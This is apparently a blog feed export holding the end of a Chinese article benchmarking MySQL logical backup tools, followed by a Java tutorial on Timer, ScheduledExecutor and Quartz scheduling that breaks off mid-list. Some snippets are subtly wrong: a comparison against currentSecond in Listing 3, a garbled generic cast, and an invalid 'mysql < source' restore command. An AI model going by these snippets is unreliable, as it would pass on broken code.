[root@localhost ~]# mysqlpump -uroot -p123456 -h172.16.60.211 --single-transaction --default-character-set&#x3D;utf8 --compress-output&#x3D;LZ4 --default-parallelism&#x3D;3 -B kevin &gt; &#x2F;data&#x2F;db_backup&#x2F;kevin_db.sql.lz4
 
mysqldump备份压缩kevin数据库 单个线程备份，消耗时间：900s，gzip的压缩率比LZ4的高
[root@localhost ~]# mysqldump -uroot -p123456 -h172.16.60.211 --default-character-set&#x3D;utf8 -P3306 --skip-opt --add-drop-table --create-options  --quick --extended-insert --single-transaction -B kevin | gzip &gt; &#x2F;data&#x2F;db_backup&#x2F;kevin.sql.gz
 
mydumper备份kevin数据库 三个并发线程备份，消耗时间：300s，gzip的压缩率比LZ4的高
[root@localhost ~]# mydumper -u root -p123456  -h 172.16.60.211 -P 3306 -t 3 -c -l 3600 -s 10000000 -B kevin -o &#x2F;data&#x2F;db_backup&#x2F;kevin&#x2F;
 
mydumper备份kevin数据库，五个并发线程备份，并且开启对一张表多个线程以chunk的方式批量导出，-r。消耗时间：180s
[root@localhost ~]# mydumper -u root -p123456  -h 172.16.60.211 -P 3306 -t 5 -c -r 300000 -l 3600 -s 10000000 -B kevin -o &#x2F;data&#x2F;db_backup&#x2F;kevin&#x2F;
 
注意： 如果是开启了GTID功能的数据库，备份时还需要添加&quot;--set-gtid-purged&#x3D;off&quot;参数，否则可能会报错！

从上面看出，mysqlpump 的备份效率是最快的，mydumper 次之，mysqldump 最差。所以在 IO 允许的情况下，能用多线程就别用单线程备份。并且 mysqlpump 还支持多数据库的并行备份，而 mydumper 要么备份一个库，要么就备份所有库。可以看出，在 mysql 数据库备份方面，mysqlpump 比 mysqldump 的测试结果要好。由于实际情况不同，测试给出的速度提升只是参考。到底开启多少个并行备份的线程，这个看磁盘 IO 的承受能力，若该服务器只进行备份任务，可以最大限制的来利用磁盘。
测试中发现 mysqlpump 和 mysqldump 对比：  

mysqldump 默认是不会有建库命令， 但是默认会有 drop table 的命令;  
mysqlpump 默认是有建库命令，但是不会有 drop table 的命令，所以 mysqlpump 恢复的时候不要直接 &lt; file.sql ;  
mysqldump 恢复时会先创建表及其所有索引，然后再导入数据；mysqlpump 恢复时会先创建表，然后再导入数据，最后建索引;  
mysqlpump 可以指定多线程并发备份，默认是 2 个；备份时会有进度指示，虽然只是估计值，但不会再想 mysqldump 备份时那么枯燥，看不到过程.

注意：mysqlpump 备份的几个重要参数
--default-parallelism   指定线程数,默认开2个线程进行并发备份
--parallel-schemas      指定哪些数据库进行并发备份
--set-gtid-purged&#x3D;OFF   这个是5.7.18版本后加入的参数,
 
--set-gtid-purged&#x3D;OFF这个参数很重要，如果备份命令里不加上，则备份可能会报错：
Warning： A partial dump from a server that has GTIDs will by default include the GTIDs of all transactions, even those that changed 
suppressed parts of the database. If you don&#39;t want to restore GTIDs, pass --set-gtid-purged&#x3D;OFF. To make a complete dump, pass 
--all-databases --triggers --routines --events.

备份演示备份命令[root@localhost ~]# mysqlpump --single-transaction --set-gtid-purged&#x3D;OFF --parallel-schemas&#x3D;2：kevin --parallel-schemas&#x3D;4：dbt3 -B kevin dbt3 -p123456 &gt; &#x2F;tmp&#x2F;backup.sql
mysqlpump： [Warning] Using a password on the command line interface can be insecure.
Dump progress： 1&#x2F;5 tables, 0&#x2F;7559817 rows
Dump progress： 3&#x2F;15 tables, 286750&#x2F;12022332 rows
Dump progress： 3&#x2F;15 tables, 686750&#x2F;12022332 rows
Dump progress： 3&#x2F;15 tables, 1042250&#x2F;12022332 rows
...
Dump completed in 43732 milliseconds
 
接着另外打开一个终端会话，登录mysql看下情况
(root@172.16.0.10) [(none)]&gt; show processlist;
+--------+------+------------------+------+---------+------+-------------------+------------------------------------------------------------------------------------------------------+
| Id     | User | Host             | db   | Command | Time | State             | Info                                                                                                 |
+--------+------+------------------+------+---------+------+-------------------+------------------------------------------------------------------------------------------------------+
| 138199 | root | 172.16.60.50：39238 | NULL | Query   |    0 | starting          | show processlist                                                                                     |
| 138267 | root | 172.16.60.50：39776 | NULL | Sleep   |    2 |                   | NULL                                                                                                 |
| 138268 | root | 172.16.60.50：39778 | NULL | Query   |    2 | Sending to client | SELECT SQL_NO_CACHE &#96;emp_no&#96;,&#96;dept_no&#96;,&#96;from_date&#96;,&#96;to_date&#96;  FROM &#96;kevin&#96;.&#96;dept_emp&#96;            |
| 138269 | root | 172.16.60.50：39780 | NULL | Query   |    2 | Sending to client | SELECT SQL_NO_CACHE &#96;emp_no&#96;,&#96;birth_date&#96;,&#96;first_name&#96;,&#96;last_name&#96;,&#96;gender&#96;,&#96;hire_date&#96;  FROM &#96;emplo |
| 138270 | root | 172.16.60.50：39782 | NULL | Query   |    2 | Sending to client | SELECT SQL_NO_CACHE &#96;o_orderkey&#96;,&#96;o_custkey&#96;,&#96;o_orderstatus&#96;,&#96;o_totalprice&#96;,&#96;o_orderDATE&#96;,&#96;o_orderpr |
| 138271 | root | 172.16.60.50：39784 | NULL | Query   |    2 | Sending to client | SELECT SQL_NO_CACHE &#96;p_partkey&#96;,&#96;p_name&#96;,&#96;p_mfgr&#96;,&#96;p_brand&#96;,&#96;p_type&#96;,&#96;p_size&#96;,&#96;p_container&#96;,&#96;p_retai |
| 138272 | root | 172.16.60.50：39786 | NULL | Query   |    2 | Sending data      | SELECT SQL_NO_CACHE &#96;l_orderkey&#96;,&#96;l_partkey&#96;,&#96;l_suppkey&#96;,&#96;l_linenumber&#96;,&#96;l_quantity&#96;,&#96;l_extendedpric |
| 138273 | root | 172.16.60.50：39788 | NULL | Query   |    2 | Sending to client | SELECT SQL_NO_CACHE &#96;c_custkey&#96;,&#96;c_name&#96;,&#96;c_address&#96;,&#96;c_nationkey&#96;,&#96;c_phone&#96;,&#96;c_acctbal&#96;,&#96;c_mktsegme |
| 138274 | root | 172.16.60.50：39790 | NULL | Sleep   |    2 |                   | NULL                                                                                                 |
| 138275 | root | 172.16.60.50：39792 | NULL | Sleep   |    1 |                   | NULL                                                                                                 |
+--------+------+------------------+------+---------+------+-------------------+------------------------------------------------------------------------------------------------------+
10 rows in set (0.00 sec)
 
可以看到138268和138269在备份kevin库,138270,138271,138272,138273在备份dbt3,这里没打印全。

备份过程如下终端会话1：
(root@localhost) [(none)]&gt; truncate mysql.general_log;
Query OK, 0 rows affected (0.10 sec)
 
(root@localhost) [(none)]&gt; set global log_output &#x3D; &#39;table&#39;;
Query OK, 0 rows affected (0.00 sec)
 
(root@localhost) [(none)]&gt; set global general_log &#x3D; 1;
Query OK, 0 rows affected (0.03 sec)
 
 
终端会话2：
[root@VM_0_5_centos ~]# mysqlpump --single-transaction kevin --set-gtid-purged&#x3D;OFF -p123456&gt; &#x2F;tmp&#x2F;backup.sql
Dump completed in 592 milliseconds
 
(root@localhost) [(none)]&gt; select thread_id,left(argument, 64) from mysql.general_log order by event_time;
................
................
+-----------+------------------------------------------------------------------+
|         7 | root@localhost on  using Socket                                  |
|         7 | FLUSH TABLES WITH READ LOCK                                      |
|         7 | SHOW WARNINGS                                                    |
|         7 | SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ          |
|         7 | SHOW WARNINGS                                                    |
|         7 | START TRANSACTION WITH CONSISTENT SNAPSHOT                       |
|         7 | SHOW WARNINGS                                                    |
|         8 | root@localhost on  using Socket                                  |
|         8 | SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ          |
|         8 | SHOW WARNINGS                                                    |
|         8 | START TRANSACTION WITH CONSISTENT SNAPSHOT                       |
|         8 | SHOW WARNINGS                                                    |
|         9 | root@localhost on  using Socket                                  |
|         9 | SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ          |
|         9 | SHOW WARNINGS                                                    |
|         9 | START TRANSACTION WITH CONSISTENT SNAPSHOT                       |
|         9 | SHOW WARNINGS                                                    |
|         7 | UNLOCK TABLES                                                    |
|         7 | SHOW WARNINGS                                                    |
|         9 | SET SQL_QUOTE_SHOW_CREATE&#x3D; 1                                     |
|         9 | SHOW WARNINGS                                                    |
|         9 | SET TIME_ZONE&#x3D;&#39;+00：00&#39;                                           |
|         8 | SET SQL_QUOTE_SHOW_CREATE&#x3D; 1                                     |
|         8 | SHOW WARNINGS                                                    |
|         8 | SET TIME_ZONE&#x3D;&#39;+00：00&#39;                                           |
|         3 | set global general_log &#x3D; 0                                       |
+-----------+------------------------------------------------------------------+
 
根据上面信息，可以看出：
-  线程7 进行 FLUSH TABLES WITH READ LOCK 。对表加一个读锁
-  线程7、8、9分别开启一个事务（RR隔离级别）去备份数据,由于之前锁表了,所以这三个线程备份出的数据是具有一致性的
-  线程7 解锁 UNLOCK TABLE
-  整个过程都没有获取二进制位置点

compress-outputmysqlpump 支持压缩输出, 支持 LZ4 和 ZLIB（ZLIB 压缩比相对较高, 但是速度较慢）
[root@localhost tmp]# mysqlpump --single-transaction --compress-output&#x3D;lz4 kevin --set-gtid-purged&#x3D;OFF -p123456 &gt; &#x2F;tmp&#x2F;backup_kevin.sql
Dump completed in 511 milliseconds

备份恢复未压缩的备份
mysql &lt; source &#x2F;tmp&#x2F;backup.sql;

压缩过的备份
先解压
[root@localhost ~]# lz4_decompress &#x2F;tmp&#x2F;backup_kevin.sql &#x2F;tmp&#x2F;kevin.sql

再导入
mysql &lt; source &#x2F;tmp&#x2F;kevin.sql;

可以看出来, 这个导入是单线程。mysqlpump 备份的数据恢复时会先插入数据, 再建索引, 而 mysqldump 备份的数据恢复是在建立表的时候就把索引加上了, 所以前者备份的数据恢复时速度要快一点！
总体来说 mysqlpump 还是很好用的，尤其是多数据库表的备份。不过如果有一张表格外大，那么备份的大部分时间还是要消耗在这张表上，因为 mysqlpump 的备份是基于表并行的，对于每张表的导出只能是单个线程的。另外注意 mysqlpump 备份时并发线程的数量还是要看自身服务器的 IO 负载能力，并不是说一味的增加并发线程数量就可以加快速度。mysqldump 和 mysqlpump 的使用方法绝大部分一致，mysqlpump 新的参数文章上已经标明，到底用那种工具备份数据库这个要在具体的环境下才能做出选择，有些时候可能用物理备份更好（xtrabackup），总之根据需要进行测试，最后再决定使用哪种备份工具进行备份。

原文地址 https://www.cnblogs.com/kevingrace/p/9760185.html

]]></content>
      <tags>
        <tag>mysql</tag>
        <tag>备份</tag>
      </tags>
  </entry>
  <entry>
    <title>几种任务调度的Java实现方法与比较</title>
    <url>/2021/03/12/%E5%87%A0%E7%A7%8D%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E7%9A%84Java%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E4%B8%8E%E6%AF%94%E8%BE%83/</url>
    <content><![CDATA[前言任务调度是指基于给定时间点，给定时间间隔或者给定执行次数自动执行任务。本文由浅入深介绍四种任务调度的 Java 实现：

Timer
ScheduledExecutor
开源工具包 Quartz
开源工具包 JCronTab

此外，为结合实现复杂的任务调度，本文还将介绍 Calendar 的一些使用方法。


Timer相信大家都已经非常熟悉 java.util.Timer 了，它是最简单的一种实现任务调度的方法，下面给出一个具体的例子：
清单 1. 使用 Timer 进行任务调度package com.ibm.scheduler;
import java.util.Timer;
import java.util.TimerTask;

public class TimerTest extends TimerTask &#123;

	private String jobName &#x3D; &quot;&quot;;

    public TimerTest(String jobName) &#123;
        super();
        this.jobName &#x3D; jobName;
    &#125;

    @Override
    public void run() &#123;
        System.out.println(&quot;execute &quot; + jobName);
    &#125;

    public static void main(String[] args) &#123;
        Timer timer &#x3D; new Timer();
        long delay1 &#x3D; 1 * 1000;
        long period1 &#x3D; 1000;
        &#x2F;&#x2F; 从现在开始 1 秒钟之后，每隔 1 秒钟执行一次 job1
        timer.schedule(new TimerTest(&quot;job1&quot;), delay1, period1);
        long delay2 &#x3D; 2 * 1000;
        long period2 &#x3D; 2000;
        &#x2F;&#x2F; 从现在开始 2 秒钟之后，每隔 2 秒钟执行一次 job2
        timer.schedule(new TimerTest(&quot;job2&quot;), delay2, period2);
    &#125;
 &#125;
 Output:
 execute job1
 execute job1
 execute job2
 execute job1
 execute job1
 execute job2

使用 Timer 实现任务调度的核心类是 Timer 和 TimerTask。其中 Timer 负责设定 TimerTask 的起始与间隔执行时间。使用者只需要创建一个 TimerTask 的继承类，实现自己的 run 方法，然后将其丢给 Timer 去执行即可。
Timer 的设计核心是一个 TaskList 和一个 TaskThread。Timer 将接收到的任务丢到自己的 TaskList 中，TaskList 按照 Task 的最初执行时间进行排序。TimerThread 在创建 Timer 时会启动成为一个守护线程。
这个线程会轮询所有任务，找到一个最近要执行的任务，然后休眠，当到达最近要执行任务的开始时间点，TimerThread 被唤醒并执行该任务。之后 TimerThread 更新最近一个要执行的任务，继续休眠。
Timer 的优点在于简单易用，但由于所有任务都是由同一个线程来调度，因此所有任务都是串行执行的，同一时间只能有一个任务在执行，前一个任务的延迟或异常都将会影响到之后的任务。
ScheduledExecutor鉴于 Timer 的上述缺陷，Java 5 推出了基于线程池设计的 ScheduledExecutor。其设计思想是，每一个被调度的任务都会由线程池中一个线程去执行，因此任务是并发执行的，相互之间不会受到干扰。需要注意的是，只有当任务的执行时间到来时，ScheduedExecutor 才会真正启动一个线程，其余时间 ScheduledExecutor 都是在轮询任务的状态。
清单 2. 使用 ScheduledExecutor 进行任务调度package com.ibm.scheduler;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ScheduledExecutorTest implements Runnable &#123;
    private String jobName &#x3D; &quot;&quot;;

    public ScheduledExecutorTest(String jobName) &#123;
        super();
        this.jobName &#x3D; jobName;
    &#125;

    @Override
    public void run() &#123;
        System.out.println(&quot;execute &quot; + jobName);
    &#125;

    public static void main(String[] args) &#123;
        ScheduledExecutorService service &#x3D; Executors.newScheduledThreadPool(10);

        long initialDelay1 &#x3D; 1;
        long period1 &#x3D; 1;
        &#x2F;&#x2F; 从现在开始1秒钟之后，每隔1秒钟执行一次job1
        service.scheduleAtFixedRate(
                new ScheduledExecutorTest(&quot;job1&quot;), initialDelay1,
                period1, TimeUnit.SECONDS);

        long initialDelay2 &#x3D; 1;
        long delay2 &#x3D; 1;
        &#x2F;&#x2F; 从现在开始2秒钟之后，每隔2秒钟执行一次job2
        service.scheduleWithFixedDelay(
                new ScheduledExecutorTest(&quot;job2&quot;), initialDelay2,
                delay2, TimeUnit.SECONDS);
    &#125;
&#125;
Output:
execute job1
execute job1
execute job2
execute job1
execute job1
execute job2

清单 2 展示了 ScheduledExecutorService 中两种最常用的调度方法 ScheduleAtFixedRate 和 ScheduleWithFixedDelay。ScheduleAtFixedRate 每次执行时间为上一次任务开始起向后推一个时间间隔，即每次执行时间为 :initialDelay, initialDelay+period, initialDelay+2period,…；ScheduleWithFixedDelay 每次执行时间为上一次任务结束起向后推一个时间间隔，即每次执行时间为：initialDelay, initialDelay+executeTime+delay, initialDelay+2executeTime+2*delay。
由此可见，ScheduleAtFixedRate 是基于固定时间间隔进行任务调度，ScheduleWithFixedDelay 取决于每次任务执行的时间长短，是基于不固定时间间隔进行任务调度。
用 ScheduledExecutor 和 Calendar 实现复杂任务调度Timer 和 ScheduledExecutor 都仅能提供基于开始时间与重复间隔的任务调度，不能胜任更加复杂的调度需求。比如，设置每星期二的 16:38:10 执行任务。该功能使用 Timer 和 ScheduledExecutor 都不能直接实现，但我们可以借助 Calendar 间接实现该功能。
清单 3. 使用 ScheduledExcetuor 和 Calendar 进行任务调度package com.ibm.scheduler;

import java.util.Calendar;
import java.util.Date;
import java.util.TimerTask;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ScheduledExceutorTest2 extends TimerTask &#123;

    private String jobName &#x3D; &quot;&quot;;

    public ScheduledExceutorTest2(String jobName) &#123;
        super();
        this.jobName &#x3D; jobName;
    &#125;

    @Override
    public void run() &#123;
        System.out.println(&quot;Date &#x3D; &quot;+new Date()+&quot;, execute &quot; + jobName);
    &#125;

    &#x2F;**
     * 计算从当前时间currentDate开始，满足条件dayOfWeek, hourOfDay,
     * minuteOfHour, secondOfMinite的最近时间
     * @return
     *&#x2F;
    public Calendar getEarliestDate(Calendar currentDate, int dayOfWeek,
            int hourOfDay, int minuteOfHour, int secondOfMinite) &#123;
        &#x2F;&#x2F;计算当前时间的WEEK_OF_YEAR,DAY_OF_WEEK, HOUR_OF_DAY, MINUTE,SECOND等各个字段值
        int currentWeekOfYear &#x3D; currentDate.get(Calendar.WEEK_OF_YEAR);
        int currentDayOfWeek &#x3D; currentDate.get(Calendar.DAY_OF_WEEK);
        int currentHour &#x3D; currentDate.get(Calendar.HOUR_OF_DAY);
        int currentMinute &#x3D; currentDate.get(Calendar.MINUTE);
        int currentSecond &#x3D; currentDate.get(Calendar.SECOND);

        &#x2F;&#x2F;如果输入条件中的dayOfWeek小于当前日期的dayOfWeek,则WEEK_OF_YEAR需要推迟一周
        boolean weekLater &#x3D; false;
        if (dayOfWeek &lt; currentDayOfWeek) &#123;
            weekLater &#x3D; true;
        &#125; else if (dayOfWeek &#x3D;&#x3D; currentDayOfWeek) &#123;
            &#x2F;&#x2F;当输入条件与当前日期的dayOfWeek相等时，如果输入条件中的
            &#x2F;&#x2F;hourOfDay小于当前日期的
            &#x2F;&#x2F;currentHour，则WEEK_OF_YEAR需要推迟一周
            if (hourOfDay &lt; currentHour) &#123;
                weekLater &#x3D; true;
            &#125; else if (hourOfDay &#x3D;&#x3D; currentHour) &#123;
                 &#x2F;&#x2F;当输入条件与当前日期的dayOfWeek, hourOfDay相等时，
                 &#x2F;&#x2F;如果输入条件中的minuteOfHour小于当前日期的
                &#x2F;&#x2F;currentMinute，则WEEK_OF_YEAR需要推迟一周
                if (minuteOfHour &lt; currentMinute) &#123;
                    weekLater &#x3D; true;
                &#125; else if (minuteOfHour &#x3D;&#x3D; currentSecond) &#123;
                     &#x2F;&#x2F;当输入条件与当前日期的dayOfWeek, hourOfDay，
                     &#x2F;&#x2F;minuteOfHour相等时，如果输入条件中的
                    &#x2F;&#x2F;secondOfMinite小于当前日期的currentSecond，
                    &#x2F;&#x2F;则WEEK_OF_YEAR需要推迟一周
                    if (secondOfMinite &lt; currentSecond) &#123;
                        weekLater &#x3D; true;
                    &#125;
                &#125;
            &#125;
        &#125;
        if (weekLater) &#123;
            &#x2F;&#x2F;设置当前日期中的WEEK_OF_YEAR为当前周推迟一周
            currentDate.set(Calendar.WEEK_OF_YEAR, currentWeekOfYear + 1);
        &#125;
        &#x2F;&#x2F; 设置当前日期中的DAY_OF_WEEK,HOUR_OF_DAY,MINUTE,SECOND为输入条件中的值。
        currentDate.set(Calendar.DAY_OF_WEEK, dayOfWeek);
        currentDate.set(Calendar.HOUR_OF_DAY, hourOfDay);
        currentDate.set(Calendar.MINUTE, minuteOfHour);
        currentDate.set(Calendar.SECOND, secondOfMinite);
        return currentDate;

    &#125;

    public static void main(String[] args) throws Exception &#123;

        ScheduledExceutorTest2 test &#x3D; new ScheduledExceutorTest2(&quot;job1&quot;);
        &#x2F;&#x2F;获取当前时间
        Calendar currentDate &#x3D; Calendar.getInstance();
        long currentDateLong &#x3D; currentDate.getTime().getTime();
        System.out.println(&quot;Current Date &#x3D; &quot; + currentDate.getTime().toString());
        &#x2F;&#x2F;计算满足条件的最近一次执行时间
        Calendar earliestDate &#x3D; test
                .getEarliestDate(currentDate, 3, 16, 38, 10);
        long earliestDateLong &#x3D; earliestDate.getTime().getTime();
        System.out.println(&quot;Earliest Date &#x3D; &quot;
                + earliestDate.getTime().toString());
        &#x2F;&#x2F;计算从当前时间到最近一次执行时间的时间间隔
        long delay &#x3D; earliestDateLong - currentDateLong;
        &#x2F;&#x2F;计算执行周期为一星期
        long period &#x3D; 7 * 24 * 60 * 60 * 1000;
        ScheduledExecutorService service &#x3D; Executors.newScheduledThreadPool(10);
        &#x2F;&#x2F;从现在开始delay毫秒之后，每隔一星期执行一次job1
        service.scheduleAtFixedRate(test, delay, period,
                TimeUnit.MILLISECONDS);

    &#125;
&#125;
Output:
Current Date &#x3D; Wed Feb 02 17:32:01 CST 2011
Earliest Date &#x3D; Tue Feb 8 16:38:10 CST 2011
Date &#x3D; Tue Feb 8 16:38:10 CST 2011, execute job1
Date &#x3D; Tue Feb 15 16:38:10 CST 2011, execute job1

清单 3 实现了每星期二 16:38:10 调度任务的功能。其核心在于根据当前时间推算出最近一个星期二 16:38:10 的绝对时间，然后计算与当前时间的时间差，作为调用 ScheduledExceutor 函数的参数。
计算最近时间要用到 java.util.calendar 的功能。首先需要解释 calendar 的一些设计思想。Calendar 有以下几种唯一标识一个日期的组合方式：
YEAR + MONTH + DAY_OF_MONTH
YEAR + MONTH + WEEK_OF_MONTH + DAY_OF_WEEK
YEAR + MONTH + DAY_OF_WEEK_IN_MONTH + DAY_OF_WEEK
YEAR + DAY_OF_YEAR
YEAR + DAY_OF_WEEK + WEEK_OF_YEAR

上述组合分别加上 HOUR_OF_DAY + MINUTE + SECOND 即为一个完整的时间标识。本例采用了最后一种组合方式。输入为 DAY_OF_WEEK, HOUR_OF_DAY, MINUTE, SECOND 以及当前日期 , 输出为一个满足 DAY_OF_WEEK, HOUR_OF_DAY, MINUTE, SECOND 并且距离当前日期最近的未来日期。计算的原则是从输入的 DAY_OF_WEEK 开始比较，如果小于当前日期的 DAY_OF_WEEK，则需要向 WEEK_OF_YEAR 进一， 即将当前日期中的 WEEK_OF_YEAR 加一并覆盖旧值；如果等于当前的 DAY_OF_WEEK, 则继续比较 HOUR_OF_DAY；如果大于当前的 DAY_OF_WEEK，则直接调用 java.util.calenda 的 calendar.set(field, value) 函数将当前日期的 DAY_OF_WEEK, HOUR_OF_DAY, MINUTE, SECOND 赋值为输入值，依次类推，直到比较至 SECOND。读者可以根据输入需求选择不同的组合方式来计算最近执行时间。
可以看出，用上述方法实现该任务调度比较麻烦，这就需要一个更加完善的任务调度框架来解决这些复杂的调度问题。幸运的是，开源工具包 Quartz 与 JCronTab 提供了这方面强大的支持。
QuartzQuartz 可以满足更多更复杂的调度需求，首先让我们看看如何用 Quartz 实现每星期二 16:38 的调度安排：
清单 4. 使用 Quartz 进行任务调度package com.ibm.scheduler;
import java.util.Date;

import org.quartz.Job;
import org.quartz.JobDetail;
import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;
import org.quartz.Scheduler;
import org.quartz.SchedulerFactory;
import org.quartz.Trigger;
import org.quartz.helpers.TriggerUtils;

public class QuartzTest implements Job &#123;

    @Override
    &#x2F;&#x2F;该方法实现需要执行的任务
    public void execute(JobExecutionContext arg0) throws JobExecutionException &#123;
        System.out.println(&quot;Generating report - &quot;
                + arg0.getJobDetail().getFullName() + &quot;, type &#x3D;&quot;
                + arg0.getJobDetail().getJobDataMap().get(&quot;type&quot;));
        System.out.println(new Date().toString());
    &#125;
    public static void main(String[] args) &#123;
        try &#123;
            &#x2F;&#x2F; 创建一个Scheduler
            SchedulerFactory schedFact &#x3D;
            new org.quartz.impl.StdSchedulerFactory();
            Scheduler sched &#x3D; schedFact.getScheduler();
            sched.start();
            &#x2F;&#x2F; 创建一个JobDetail，指明name，groupname，以及具体的Job类名，
            &#x2F;&#x2F;该Job负责定义需要执行任务
            JobDetail jobDetail &#x3D; new JobDetail(&quot;myJob&quot;, &quot;myJobGroup&quot;,
                    QuartzTest.class);
            jobDetail.getJobDataMap().put(&quot;type&quot;, &quot;FULL&quot;);
            &#x2F;&#x2F; 创建一个每周触发的Trigger，指明星期几几点几分执行
            Trigger trigger &#x3D; TriggerUtils.makeWeeklyTrigger(3, 16, 38);
            trigger.setGroup(&quot;myTriggerGroup&quot;);
            &#x2F;&#x2F; 从当前时间的下一秒开始执行
            trigger.setStartTime(TriggerUtils.getEvenSecondDate(new Date()));
            &#x2F;&#x2F; 指明trigger的name
            trigger.setName(&quot;myTrigger&quot;);
            &#x2F;&#x2F; 用scheduler将JobDetail与Trigger关联在一起，开始调度任务
            sched.scheduleJob(jobDetail, trigger);

        &#125; catch (Exception e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;
Output:
Generating report - myJobGroup.myJob, type &#x3D;FULL
Tue Feb 8 16:38:00 CST 2011
Generating report - myJobGroup.myJob, type &#x3D;FULL
Tue Feb 15 16:38:00 CST 2011

清单 4 非常简洁地实现了一个上述复杂的任务调度。Quartz 设计的核心类包括 Scheduler, Job 以及 Trigger。其中，Job 负责定义需要执行的任务，Trigger 负责设置调度策略，Scheduler 将二者组装在一起，并触发任务开始执行。
Job使用者只需要创建一个 Job 的继承类，实现 execute 方法。JobDetail 负责封装 Job 以及 Job 的属性，并将其提供给 Scheduler 作为参数。每次 Scheduler 执行任务时，首先会创建一个 Job 的实例，然后再调用 execute 方法执行。Quartz 没有为 Job 设计带参数的构造函数，因此需要通过额外的 JobDataMap 来存储 Job 的属性。JobDataMap 可以存储任意数量的 Key，Value 对，例如：
清单 5. 为 JobDataMap 赋值jobDetail.getJobDataMap().put(&quot;myDescription&quot;, &quot;my job description&quot;);
 jobDetail.getJobDataMap().put(&quot;myValue&quot;, 1998);
 ArrayList&lt;String&gt; list &#x3D; new ArrayList&lt;String&gt;();
 list.add(&quot;item1&quot;);
 jobDetail.getJobDataMap().put(&quot;myArray&quot;, list);

JobDataMap 中的数据可以通过下面的方式获取：
清单 6. 获取 JobDataMap 的值public class JobDataMapTest implements Job &#123;

    @Override
    public void execute(JobExecutionContext context)
            throws JobExecutionException &#123;
        &#x2F;&#x2F;从context中获取instName，groupName以及dataMap
        String instName &#x3D; context.getJobDetail().getName();
        String groupName &#x3D; context.getJobDetail().getGroup();
        JobDataMap dataMap &#x3D; context.getJobDetail().getJobDataMap();
        &#x2F;&#x2F;从dataMap中获取myDescription，myValue以及myArray
        String myDescription &#x3D; dataMap.getString(&quot;myDescription&quot;);
        int myValue &#x3D; dataMap.getInt(&quot;myValue&quot;);
        ArrayList&lt;String&gt; myArray &#x3D; (ArrayListlt;Strin&gt;) dataMap.get(&quot;myArray&quot;);
        System.out.println(&quot;
                Instance &#x3D;&quot; + instName + &quot;, group &#x3D; &quot; + groupName
                + &quot;, description &#x3D; &quot; + myDescription + &quot;, value &#x3D;&quot; + myValue
                + &quot;, array item0 &#x3D; &quot; + myArray.get(0));

    &#125;
&#125;
Output：
Instance &#x3D; myJob, group &#x3D; myJobGroup,
description &#x3D; my job description,
value &#x3D;1998, array item0 &#x3D; item1

TriggerTrigger 的作用是设置调度策略。Quartz 设计了多种类型的 Trigger，其中最常用的是 SimpleTrigger 和 CronTrigger。
SimpleTrigger 适用于在某一特定的时间执行一次，或者在某一特定的时间以某一特定时间间隔执行多次。
上述功能决定了 SimpleTrigger 的参数包括 start-time, end-time, repeat count, 以及 repeat interval。
Repeat count 取值为大于或等于零的整数，或者常量 SimpleTrigger.REPEAT_INDEFINITELY。
Repeat interval 取值为大于或等于零的长整型。当 Repeat interval 取值为零并且 Repeat count 取值大于零时，将会触发任务的并发执行。
Start-time 与 dnd-time 取值为 java.util.Date。当同时指定 end-time 与 repeat count 时，优先考虑 end-time。一般地，可以指定 end-time，并设定 repeat count 为 REPEAT_INDEFINITELY。
以下是 SimpleTrigger 的构造方法：
public SimpleTrigger(String name,
                     String group,
                     Date startTime,
                     Date endTime,
                     int repeatCount,
                     long repeatInterval)

举例如下：创建一个立即执行且仅执行一次的 SimpleTrigger：
SimpleTrigger trigger &#x3D; new SimpleTrigger(&quot;myTrigger&quot;, &quot;myGroup&quot;, new Date(), null, 0, 0L);

创建一个半分钟后开始执行，且每隔一分钟重复执行一次的 SimpleTrigger：
SimpleTrigger trigger &#x3D; new SimpleTrigger(&quot;myTrigger&quot;, &quot;myGroup&quot;, 
                                          new Date(System.currentTimeMillis()+30*1000), null, 0, 60*1000);

创建一个 2011 年 6 月 1 日 8:30 开始执行，每隔一小时执行一次，一共执行一百次，一天之后截止的 SimpleTrigger：
Calendar calendar &#x3D; Calendar.getInstance();
calendar.set(Calendar.YEAR, 2011);
calendar.set(Calendar.MONTH, Calendar.JUNE);
calendar.set(Calendar.DAY_OF_MONTH, 1);
calendar.set(Calendar.HOUR, 8);
calendar.set(Calendar.MINUTE, 30);
calendar.set(Calendar.SECOND, 0);
calendar.set(Calendar.MILLISECOND, 0);
Date startTime &#x3D; calendar.getTime();
Date endTime &#x3D; new Date(calendar.getTimeInMillis() + 24*60*60*1000);
SimpleTrigger trigger&#x3D;new SimpleTrigger(&quot;myTrigger&quot;, &quot;myGroup&quot;, startTime, endTime, 100, 60*60*1000);

上述最后一个例子中，同时设置了 end-time 与 repeat count，则优先考虑 end-time，总共可以执行二十四次。
CronTrigger 的用途更广，相比基于特定时间间隔进行调度安排的 SimpleTrigger，CronTrigger 主要适用于基于日历的调度安排。例如：每星期二的 16:38:10 执行，每月一号执行，以及更复杂的调度安排等。
CronTrigger 同样需要指定 start-time 和 end-time，其核心在于 Cron 表达式，由七个字段组成：
Seconds
Minutes
Hours
Day-of-Month
Month
Day-of-Week
Year (Optional field)

举例如下：
创建一个每三小时执行的 CronTrigger，且从每小时的整点开始执行：
0 0 0&#x2F;3  * * ?

创建一个每十分钟执行的 CronTrigger，且从每小时的第三分钟开始执行：
0 3&#x2F;10 * * * ?

创建一个每周一，周二，周三，周六的晚上 20:00 到 23:00，每半小时执行一次的 CronTrigger：
0 0&#x2F;30 20-23 ? * MON-WED,SAT

创建一个每月最后一个周四，中午 11:30-14:30，每小时执行一次的 trigger：
0 30 11-14&#x2F;1 ? * 5L

解释一下上述例子中各符号的含义：
首先所有字段都有自己特定的取值
Seconds 和 Minutes 取值为 0 到 59
Hours 取值为 0 到 23
Day-of-Month 取值为 0-31
Month 取值为 0-11，或者 JAN，FEB, MAR, APR, MAY, JUN, JUL, AUG, SEP, OCT, NOV, DEC
